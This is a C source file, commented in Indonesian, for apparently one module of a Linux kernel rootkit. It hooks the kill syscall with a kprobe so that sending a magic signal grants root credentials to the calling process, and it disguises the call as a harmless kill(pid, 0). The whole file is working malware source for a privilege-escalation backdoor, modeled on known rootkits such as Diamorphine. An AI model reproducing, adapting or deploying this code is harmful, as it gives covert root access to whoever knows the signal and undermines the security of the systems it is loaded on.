/*
 * hook_kill.c — LPE via sinyal magic (kprobe pada __x64_sys_kill).
 *
 * Konsep (gaya bds "kill000" / Diamorphine "kill -64"):
 *   user menjalankan:  kill -s63 1
 *   hook menangkap SEBELUM syscall dieksekusi:
 *     - grant root ke proses PEMANGGIL (current), BUKAN pid tujuan
 *     - ubah argumen jadi kill(pid, 0) -> ceksaja, tidak berbahaya
 *   -> pemanggil keluar dari syscall dengan uid=0, tanpa efek samping.
 *
 * x86_64:
 *   __x64_sys_kill(const struct pt_regs *regs) -> arg1 ada di regs->di
 *   di dalam pt_regs syscall itu: di = pid, si = sig
 */
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include "rkit.h"

/* tipe fungsi kernel yang dicari via resolver (tidak dipanggil langsung,
 * jadi tidak tergantung ekspor) */
typedef struct task_struct *(*rk_pkc_t)(struct task_struct *);
typedef void               (*rk_cc_t)(struct task_struct *);

static rk_pkc_t f_prepare_kernel_cred;
static rk_cc_t  f_commit_creds;

static int kill_pre(struct kprobe *kp, struct pt_regs *regs)
{
	struct pt_regs *sregs;

	(void)kp;
	sregs = (struct pt_regs *)regs->di;     /* arg1: pt_regs* syscall */
	if (!sregs)
		return 0;

	if (sregs->si == RK_LPE_SIG) {
		if (!f_commit_creds || !f_prepare_kernel_cred) {
			f_prepare_kernel_cred =
				(rk_pkc_t)rk_lookup("prepare_kernel_cred");
			f_commit_creds =
				(rk_cc_t)rk_lookup("commit_creds");
		}
		if (f_commit_creds && f_prepare_kernel_cred) {
			f_commit_creds(f_prepare_kernel_cred(NULL));
			/* ubah jadi kill(pid, 0): ceksaja, selamat */
			sregs->si = 0;
			pr_info("rkit: root diberikan ke pid %d\n",
				(int)current->pid);
		} else {
			pr_warn("rkit: symbol commit_creds tak ditemukan\n");
		}
	}
	return 0;                              /*0 = lanjut ke fungsi asli */
}

static struct kprobe kp_kill = {
	.pre_handler = kill_pre,
	.symbol_name = "__x64_sys_kill",
};

int rk_kill_init(void)
{
	int ret = register_kprobe(&kp_kill);

	if (ret)
		pr_err("rkit: kill kprobe gagal (%d)\n", ret);
	else
		pr_info("rkit: hook kill aktif (sinyal %d = give root)\n",
			RK_LPE_SIG);
	return ret;
}

void rk_kill_exit(void)
{
	unregister_kprobe(&kp_kill);
	f_commit_creds = NULL;
	f_prepare_kernel_cred = NULL;
}
